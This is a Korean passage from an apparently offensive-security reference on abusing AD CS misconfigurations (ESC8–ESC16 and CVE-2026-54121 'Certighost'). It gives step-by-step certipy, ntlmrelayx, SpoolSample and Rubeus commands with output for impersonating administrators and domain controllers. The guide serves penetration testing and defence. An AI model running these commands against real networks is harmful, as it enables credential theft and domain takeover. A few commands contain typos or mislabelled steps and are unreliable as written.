그러나 이 limitation은 user용 certificate를 획득하는 NTLM relay attack을 수행하여 극복할 수 있습니다. certificate의 validity period가 session duration을 결정하고, 해당 certificate를 **NTLM signing을 요구하는 services**와 함께 사용할 수 있기 때문입니다. stolen certificate 사용 방법은 다음을 참고하십시오.


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay attacks의 또 다른 limitation은 **victim account가 attacker-controlled machine에 authenticate해야 한다는 점**입니다. attacker는 기다리거나 다음과 같이 이 authentication을 **force**할 수 있습니다.


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)의 `cas`는 **enabled HTTP AD CS endpoints**를 열거합니다:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` property는 enterprise Certificate Authorities(CA)가 Certificate Enrollment Service(CES) endpoint를 저장하는 데 사용됩니다. 이러한 endpoint는 **Certutil.exe** tool을 사용하여 파싱하고 나열할 수 있습니다:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify를 이용한 악용
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy)를 이용한 악용

기본적으로 Certipy는 계정 이름이 `$`로 끝나는지에 따라 `Machine` 또는 `User` template을 기준으로 certificate request를 수행합니다. 대체 template은 `-template` parameter를 사용하여 지정할 수 있습니다.

그런 다음 [PetitPotam](https://github.com/ly4k/PetitPotam)과 같은 technique을 사용하여 authentication을 강제로 유도할 수 있습니다. domain controller를 대상으로 하는 경우에는 `-template DomainController`를 지정해야 합니다.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## 보안 확장 없음 - ESC9 <a href="#id-5485" id="id-5485"></a>

### 설명

**`msPKI-Enrollment-Flag`**의 새로운 값 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`)은 ESC9로 불리며, 인증서에 **새로운 `szOID_NTDS_CA_SECURITY_EXT` security extension**이 포함되지 않도록 합니다. 이 flag는 **`StrongCertificateBindingEnforcement`**가 `1`(기본 설정)로 설정된 경우와 관련이 있으며, `2`로 설정된 경우와 대조됩니다. ESC9이 없더라도 요구 사항이 달라지지 않으므로, Kerberos 또는 Schannel에 대한 더 약한 certificate mapping이 악용될 수 있는 시나리오(ESC10과 같은 경우)에서 그 중요성이 더욱 커집니다.<sup>[[7]](#references)</sup>

이 flag 설정이 중요해지는 조건은 다음과 같습니다.

- `StrongCertificateBindingEnforcement`가 `2`로 조정되지 않았거나(기본값은 `1`), `CertificateMappingMethods`에 `UPN` flag가 포함되어 있습니다.
- 인증서의 `msPKI-Enrollment-Flag` 설정에 `CT_FLAG_NO_SECURITY_EXTENSION` flag가 지정되어 있습니다.
- 인증서에 모든 client authentication EKU가 지정되어 있습니다.
- 다른 계정을 compromise하기 위해 모든 계정에 대해 `GenericWrite` 권한을 사용할 수 있습니다.

### Abuse Scenario

`John@corp.local`이 `Jane@corp.local`에 대해 `GenericWrite` 권한을 보유하고 있으며, 목표가 `Administrator@corp.local`을 compromise하는 상황을 가정해 보겠습니다. `Jane@corp.local`이 enroll할 수 있는 `ESC9` certificate template은 `msPKI-Enrollment-Flag` 설정에 `CT_FLAG_NO_SECURITY_EXTENSION` flag가 구성되어 있습니다.

먼저 `John`의 `GenericWrite` 권한 덕분에 Shadow Credentials를 사용하여 `Jane`의 hash를 획득합니다:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
그 후 `Jane`의 `userPrincipalName`은 `@corp.local` 도메인 부분을 의도적으로 생략한 `Administrator`로 수정됩니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
이 수정은 `Administrator@corp.local`이 `Administrator`의 `userPrincipalName`과 여전히 별개이므로 제약 조건을 위반하지 않습니다.

이후 취약한 것으로 표시된 `ESC9` certificate template이 `Jane`으로 요청됩니다:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
인증서의 `userPrincipalName`이 “object SID” 없이 `Administrator`를 나타내는 것으로 확인됩니다.

이후 `Jane`의 `userPrincipalName`은 원래 값인 `Jane@corp.local`로 되돌립니다:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
발급된 인증서를 사용하여 인증을 시도하면 이제 `Administrator@corp.local`의 NT hash가 반환됩니다. 인증서에 domain 지정이 없으므로 명령에 `-domain <domain>`을 포함해야 합니다:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### 설명

도메인 컨트롤러의 두 레지스트리 키 값이 ESC10과 관련되어 있습니다.

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` 아래 `CertificateMappingMethods`의 기본값은 `0x18` (`0x8 | 0x10`)이며, 이전에는 `0x1F`로 설정되어 있었습니다.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` 아래 `StrongCertificateBindingEnforcement`의 기본 설정은 `1`이며, 이전에는 `0`이었습니다.<sup>[[7]](#references)</sup>

**사례 1**

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우입니다.

**사례 2**

`CertificateMappingMethods`에 `UPN` bit (`0x4`)가 포함된 경우입니다.

### 악용 사례 1

`StrongCertificateBindingEnforcement`가 `0`으로 구성된 경우, `GenericWrite` 권한이 있는 계정 A를 악용하여 모든 계정 B를 compromise할 수 있습니다.

예를 들어 `Jane@corp.local`에 대한 `GenericWrite` 권한을 보유한 경우, 공격자는 `Administrator@corp.local`을 compromise하려고 합니다. 절차는 ESC9와 동일하며, 모든 certificate template을 사용할 수 있습니다.

먼저 `GenericWrite`를 악용하는 Shadow Credentials를 사용하여 `Jane`의 hash를 가져옵니다.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
그 후 `Jane`의 `userPrincipalName`이 `Administrator`로 변경되며, 제약 조건 위반을 피하기 위해 `@corp.local` 부분은 의도적으로 생략됩니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
이후 기본 `User` template을 사용하여 client authentication을 활성화하는 certificate를 `Jane`으로 요청합니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 이후 원래 값인 `Jane@corp.local`로 되돌려집니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
획득한 certificate로 인증하면 `Administrator@corp.local`의 NT hash를 얻을 수 있으며, certificate에 domain 정보가 없으므로 명령에서 domain을 지정해야 합니다.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### 악용 사례 2

`CertificateMappingMethods`에 `UPN` 비트 플래그(`0x4`)가 포함된 경우, `GenericWrite` 권한을 가진 계정 A는 `userPrincipalName` 속성이 없는 모든 계정 B를 침해할 수 있습니다. 여기에는 컴퓨터 계정과 기본 제공 도메인 관리자 `Administrator`가 포함됩니다.

여기서는 `GenericWrite`를 활용하여 먼저 Shadow Credentials를 통해 `Jane`의 hash를 획득한 뒤, `DC$@corp.local`을 침해하는 것이 목표입니다.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`의 `userPrincipalName`은 이후 `DC$@corp.local`로 설정됩니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
기본 `User` template을 사용하여 `Jane`으로 client authentication용 certificate를 요청합니다.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`의 `userPrincipalName`은 이 프로세스 후 원래 값으로 되돌아갑니다.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel을 통해 인증하기 위해 Certipy의 `-ldap-shell` 옵션을 사용하며, `u:CORP\DC$`로 인증 성공을 나타냅니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell을 통해 `set_rbcd`와 같은 명령을 사용하면 Resource-Based Constrained Delegation (RBCD) 공격을 수행할 수 있어, 도메인 컨트롤러를 잠재적으로 장악할 수 있습니다.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
이 취약점은 `userPrincipalName`이 없거나 `sAMAccountName`과 일치하지 않는 모든 사용자 계정에도 적용되며, 기본적으로 `userPrincipalName`이 없고 상승된 LDAP 권한을 가진 기본 `Administrator@corp.local` 계정이 주요 대상입니다.

## Relaying NTLM to ICPR - ESC11

### 설명

CA Server가 `IF_ENFORCEENCRYPTICERTREQUEST`로 구성되지 않은 경우, RPC service를 통해 signing 없이 NTLM relay attacks를 수행할 수 있습니다. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

`certipy`를 사용하여 `Enforce Encryption for Requests`가 Disabled인지 열거할 수 있으며, certipy는 `ESC11` Vulnerabilities를 표시합니다.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Relay server를 설정해야 합니다:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
참고: domain controller의 경우 DomainController에서 `-template`을 지정해야 합니다.

또는 [sploutchy의 impacket fork](https://github.com/sploutchy/impacket)를 사용합니다:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## YubiHSM을 사용한 ADCS CA에 대한 Shell access - ESC12

### 설명

Administrators는 Certificate Authority가 인증서를 "Yubico YubiHSM2"와 같은 external device에 저장하도록 설정할 수 있습니다.

USB device가 USB port를 통해 CA server에 연결되어 있거나, CA server가 virtual machine인 경우 USB device server를 통해 연결되어 있다면, YubiHSM에서 Key Storage Provider가 keys를 생성하고 사용하기 위해 authentication key(때때로 "password"라고도 함)가 필요합니다.

이 key/password는 `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` 레지스트리에 cleartext로 저장됩니다.

[여기](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)를 참고하세요.<sup>[[11]](#references)</sup>

### Abuse 시나리오

shell access를 확보했을 때 CA의 private key가 physical USB device에 저장되어 있다면, 해당 key를 복구할 수 있습니다.

먼저 CA certificate(public)를 얻은 다음:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
마지막으로, `-sign` certutil 명령을 사용하여 CA 인증서와 해당 개인 키로 임의의 새 인증서를 위조합니다.

## OID Group Link Abuse - ESC13

### 설명

`msPKI-Certificate-Policy` attribute를 사용하면 인증서 template에 발급 policy를 추가할 수 있습니다. 발급 policy를 담당하는 `msPKI-Enterprise-Oid` objects는 PKI OID container의 Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services)에서 검색할 수 있습니다. policy는 이 object의 `msDS-OIDToGroupLink` attribute를 사용하여 AD group에 연결할 수 있으며, 이를 통해 시스템은 인증서를 제시한 사용자를 해당 group의 member인 것처럼 authorize할 수 있습니다. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

다시 말해, 사용자에게 인증서를 enroll할 permission이 있고 해당 인증서가 OID group에 연결되어 있으면 사용자는 이 group의 privileges를 상속할 수 있습니다.

[Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1)을 사용하여 OIDToGroupLink를 찾습니다:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

`certipy find` 또는 `Certify.exe find /showAllPermissions`를 사용하여 해당 권한을 가진 사용자를 찾습니다.

`John`에게 `VulnerableTemplate`에 등록할 권한이 있다면, 사용자는 `VulnerableGroup` 그룹의 권한을 상속할 수 있습니다.

템플릿만 지정하면 되며, `OIDToGroupLink` 권한이 있는 인증서를 받게 됩니다.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## 취약한 인증서 갱신 구성 - ESC14

### 설명

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping의 설명은 매우 철저합니다. 아래는 원문을 인용한 것입니다.<sup>[[14]](#references)</sup>

ESC14는 주로 Active Directory 사용자 또는 컴퓨터 계정의 `altSecurityIdentities` attribute를 오용하거나 안전하지 않게 구성하여 발생하는 "weak explicit certificate mapping" 취약점을 다룹니다. 이 multi-valued attribute를 사용하면 관리자가 인증 목적으로 X.509 certificates를 AD 계정에 수동으로 연결할 수 있습니다. 이 명시적 매핑이 설정되면 일반적으로 certificate의 SAN에 포함된 UPN 또는 DNS name, 혹은 `szOID_NTDS_CA_SECURITY_EXT` security extension에 포함된 SID를 사용하는 기본 certificate mapping logic을 재정의할 수 있습니다.

`altSecurityIdentities` attribute에서 certificate를 식별하는 데 사용되는 문자열 값이 지나치게 광범위하거나, 쉽게 추측할 수 있거나, 고유하지 않은 certificate fields에 의존하거나, 쉽게 spoofing할 수 있는 certificate components를 사용하는 경우 "weak" mapping이 발생합니다. 공격자가 privileged account에 대해 이러한 weak explicit mapping과 일치하는 certificate를 획득하거나 생성할 수 있다면, 해당 certificate를 사용하여 그 계정으로 인증하고 impersonate할 수 있습니다.

잠재적으로 weak한 `altSecurityIdentities` mapping string의 예시는 다음과 같습니다.

- 일반적인 Subject Common Name (CN)만을 기준으로 매핑: 예: `X509:<S>CN=SomeUser`. 공격자는 덜 안전한 source에서 이 CN을 가진 certificate를 획득할 수 있습니다.
- 특정 serial number 또는 subject key identifier와 같은 추가적인 한정 없이 지나치게 일반적인 Issuer Distinguished Names (DNs) 또는 Subject DNs 사용: 예: `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- 공격자가 합법적으로 획득하거나 위조할 수 있는 certificate에서 충족할 수 있는, 예측 가능한 기타 패턴 또는 non-cryptographic identifiers 사용 (CA를 compromise했거나 ESC1과 같은 vulnerable template을 발견한 경우).

`altSecurityIdentities` attribute는 다음과 같은 다양한 mapping format을 지원합니다.

- `X509:<I>IssuerDN<S>SubjectDN` (전체 Issuer 및 Subject DN을 기준으로 매핑)
- `X509:<SKI>SubjectKeyIdentifier` (certificate의 Subject Key Identifier extension value를 기준으로 매핑)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number를 기준으로 매핑하며, Issuer DN으로 암시적으로 한정됨) - 이는 standard format이 아니며, 일반적으로 `<I>IssuerDN<SR>SerialNumber` 형식입니다.
- `X509:<RFC822>EmailAddress` (SAN의 RFC822 name, 일반적으로 email address를 기준으로 매핑)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (certificate의 raw public key에 대한 SHA1 hash를 기준으로 매핑 - 일반적으로 강력함)

이러한 mapping의 보안성은 mapping string에서 사용되는 선택된 certificate identifiers의 구체성, 고유성 및 cryptographic strength에 크게 좌우됩니다. Domain Controllers에서 strong certificate binding modes가 활성화되어 있더라도 (이는 주로 SAN UPN/DNS 및 SID extension을 기반으로 하는 implicit mappings에 영향을 줌), 잘못 구성된 `altSecurityIdentities` entry는 mapping logic 자체에 결함이 있거나 지나치게 허용적인 경우 여전히 impersonation으로 이어지는 직접적인 경로가 될 수 있습니다.

### Abuse Scenario

ESC14는 Active Directory (AD)의 **explicit certificate mappings**, 특히 `altSecurityIdentities` attribute를 대상으로 합니다. 이 attribute가 설정되어 있으면 (의도적으로 설정되었거나 잘못 구성된 경우), 공격자는 mapping과 일치하는 certificate를 제시하여 계정을 impersonate할 수 있습니다.

#### Scenario A: 공격자가 `altSecurityIdentities`에 Write할 수 있음

**Precondition**: 공격자에게 target account의 `altSecurityIdentities` attribute에 대한 write permission이 있거나, target AD object에 대해 다음 permission 중 하나를 부여할 수 있는 권한이 있습니다.
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Scenario B: Target에 X509RFC822 (Email)을 통한 Weak Mapping이 있음

- **Precondition**: Target의 altSecurityIdentities에 weak X509RFC822 mapping이 있습니다. 공격자는 victim의 mail attribute를 target의 X509RFC822 name과 일치하도록 설정하고, victim으로 certificate를 enroll한 다음 이를 사용하여 target으로 인증할 수 있습니다.
#### Scenario C: Target에 X509IssuerSubject Mapping이 있음

- **Precondition**: Target의 `altSecurityIdentities`에 weak X509IssuerSubject explicit mapping이 있습니다. 공격자는 victim principal의 `cn` 또는 `dNSHostName` attribute를 target의 X509IssuerSubject mapping subject와 일치하도록 설정할 수 있습니다. 그런 다음 victim으로 certificate를 enroll하고, 이 certificate를 사용하여 target으로 인증할 수 있습니다.
#### Scenario D: Target에 X509SubjectOnly Mapping이 있음

- **Precondition**: Target의 `altSecurityIdentities`에 weak X509SubjectOnly explicit mapping이 있습니다. 공격자는 victim principal의 `cn` 또는 `dNSHostName` attribute를 target의 X509SubjectOnly mapping subject와 일치하도록 설정할 수 있습니다. 그런 다음 victim으로 certificate를 enroll하고, 이 certificate를 사용하여 target으로 인증할 수 있습니다.
### 구체적인 작업
#### Scenario A

certificate template `Machine`의 certificate 요청
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
인증서 저장 및 변환
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
인증(인증서 사용)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
정리 (선택 사항)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
다양한 attack scenario에서 보다 구체적인 attack method는 다음을 참조하세요: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### 설명

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc의 설명은 놀라울 정도로 상세합니다. 아래는 원문을 인용한 것입니다.<sup>[[15]](#references)</sup>

기본 제공되는 version 1 certificate template을 사용하면, attacker는 template에 지정된 구성된 Extended Key Usage attribute보다 우선 적용되는 application policy를 포함하도록 CSR을 조작할 수 있습니다. 필요한 조건은 enrollment rights뿐이며, 이를 사용해 **_WebServer_** template으로 client authentication, certificate request agent 및 codesigning certificate를 생성할 수 있습니다.

### Abuse

[Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)에는 더 자세한 사용 예제가 포함되어 있습니다.<sup>[[14]](#references)</sup>


CA에 patch가 적용되지 않은 경우, Certipy의 `find` command를 사용하면 ESC15에 취약할 가능성이 있는 V1 template을 식별할 수 있습니다.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel을 통한 직접 Impersonation

**Step 1: "Client Authentication" Application Policy와 대상 UPN을 주입하여 인증서를 요청합니다.** 공격자 `attacker@corp.local`은 등록자가 subject를 제공할 수 있는 "WebServer" V1 template을 사용하여 `administrator@corp.local`을 대상으로 지정합니다.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject"가 설정된 취약한 V1 template.
- `-application-policies 'Client Authentication'`: CSR의 Application Policies extension에 OID `1.3.6.1.5.5.7.3.2`를 삽입합니다.
- `-upn 'administrator@corp.local'`: 사칭을 위해 SAN에 UPN을 설정합니다.

**Step 2: 획득한 certificate를 사용하여 Schannel (LDAPS)을 통해 인증합니다.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### 시나리오 B: Enrollment Agent Abuse를 통한 PKINIT/Kerberos Impersonation

**1단계: "Enrollee supplies subject"가 설정된 V1 template에서 "Certificate Request Agent" Application Policy를 주입하여 certificate를 요청합니다.** 이 certificate는 공격자(`attacker@corp.local`)가 enrollment agent가 되기 위한 것입니다. 여기서는 공격자 자신의 identity에 대한 UPN을 지정하지 않습니다. 목표는 agent capability를 확보하는 것이기 때문입니다.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`을 주입합니다.

**Step 2: "agent" certificate를 사용하여 대상 privileged user를 대신해 certificate를 요청합니다.** 이는 Step 1의 certificate를 agent certificate로 사용하는 ESC3-like 단계입니다.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**3단계: "on-behalf-of" 인증서를 사용하여 권한 있는 사용자로 인증합니다.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA에서 Security Extension 비활성화(전역)-ESC16

### 설명

**ESC16 (szOID_NTDS_CA_SECURITY_EXT Extension 누락을 통한 권한 상승)**은 AD CS 구성이 모든 인증서에 **szOID_NTDS_CA_SECURITY_EXT** extension이 포함되도록 강제하지 않는 경우를 의미하며, 공격자는 다음과 같이 이를 악용할 수 있습니다.

1. **SID binding 없이** 인증서를 요청합니다.

2. 이 인증서를 **모든 계정으로 인증**하는 데 사용합니다. 예를 들어, 높은 권한을 가진 계정(Domain Administrator 등)을 impersonate할 수 있습니다.

자세한 원리는 다음 문서에서도 확인할 수 있습니다:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuse

다음은 [이 링크](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally)를 참조하며, 자세한 사용 방법을 보려면 클릭하세요.<sup>[[14]](#references)</sup>

Active Directory Certificate Services (AD CS) 환경이 **ESC16**에 취약한지 식별하려면
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**1단계: 피해자 계정의 초기 UPN 읽기 (선택 사항 - 복원을 위해).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**2단계: victim 계정의 UPN을 대상 관리자의 `sAMAccountName`으로 업데이트합니다.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Step 3: (필요한 경우) "victim" 계정의 credentials를 획득합니다(예: Shadow Credentials를 통해).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**4단계: ESC16 취약 CA에서 _적합한 클라이언트 인증 template_ (예: "User")을 사용해 "피해자" 사용자로 certificate를 요청합니다.** CA가 ESC16에 취약하므로 template에서 이 extension에 대해 설정한 특정 값과 관계없이 발급된 certificate에서 SID security extension을 자동으로 생략합니다. Kerberos credential cache 환경 변수를 설정합니다(shell command):
```bash
export KRB5CCNAME=victim.ccache
```
그런 다음 인증서를 요청합니다:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**5단계: "victim" 계정의 UPN을 되돌립니다.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**6단계: 대상 관리자로 인증합니다.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### 설명

**Certighost**는 **AD CS enrollment chase / callback path**를 악용합니다. 이 경로에서 CA는 발급된 인증서에 포함할 identity를 확인하기 위해 요청자가 제공한 request attributes를 신뢰합니다. 공개 PoC에서 조작된 request에는 다음 항목이 포함됩니다:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: CA가 연결할 attacker-controlled host/IP
- **`rmd`**: impersonate할 **target Domain Controller DNS name**

CA가 해당 chase를 수행하면 **SMB/LSA (`445`)** 및 **LDAP (`389`)**를 통해 attacker에게 연결합니다. attacker는 **real machine account**(일반적으로 기본 **`ms-DS-MachineAccountQuota`**를 통해 생성)를 사용하므로 callback session은 유효한 domain principal로 authenticate되지만, rogue services는 대신 **target DC**의 identity attributes를 반환합니다.

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA가 **반환된 identity를 authenticated callback principal에 cryptographically bind하지 않는 경우**, session이 attacker-controlled machine account로 authenticate했더라도 **Domain Controller**용 certificate를 발급할 수 있습니다. 이는 **Certifried**와 개념적으로 다릅니다. Certifried가 `dNSHostName`과 같은 AD attributes를 다시 작성하는 대신, attacker는 **CA callback resolution 중에 identity data를 대체**합니다.<sup>[[2]](#references)</sup>

**유용한 preconditions:**

- 낮은 권한의 **domain credentials**
- **computer account를 생성하거나 재사용할 수 있는 권한**
- **CA**에서 attacker-controlled **ports `389` 및 `445`**로 네트워크 연결 가능
- 취약하거나 patch되지 않은 CA request path ( **2026년 7월 14일** Microsoft update는 **`cdc`에 대한 DC validation** 및 **resolved-SID comparison**을 추가함)

생성된 **`.pfx`**는 이후 **PKINIT**에 사용할 수 있으며, **`.ccache`**와 공개 PoC flow에서는 **target DC NT hash**를 생성합니다. 이는 일반적으로 **full domain compromise**에 충분합니다.

### 악용

